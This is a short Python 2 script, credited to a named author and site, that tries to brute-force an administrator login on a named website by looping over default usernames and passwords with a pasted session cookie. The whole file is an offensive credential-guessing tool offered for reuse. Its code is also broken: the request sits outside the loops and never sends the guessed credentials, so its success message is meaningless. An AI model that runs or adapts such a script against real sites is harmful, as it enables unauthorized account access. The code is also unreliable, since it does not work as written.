#!/usr/bin/python
#This code was written by Brun0L3z of www.zuoix.com
#you may modify this script but please mention the author and give respect

#first we import a library to read URL addresses
import urllib2
users = ("admin", "administrator", "root", "kuroshi")
passwords = ("admin", "administrator", "password", "korn")
#make sure to add more users and passwords
for user in users:
	for password in passwords:
		url = "http://www.blackhole-vpn.tk/"
reg = urllib2.Request(url)
reg.add_header("Cookie", "PHPSESSID=enter cookieid here;security=low")
response = urllib2.urlopen(reg)
html = response.read()
if "enter wrong response" not in html: #change to error message you get when login fails
	print "administrator's username and password --- %s : %s" %(user, password)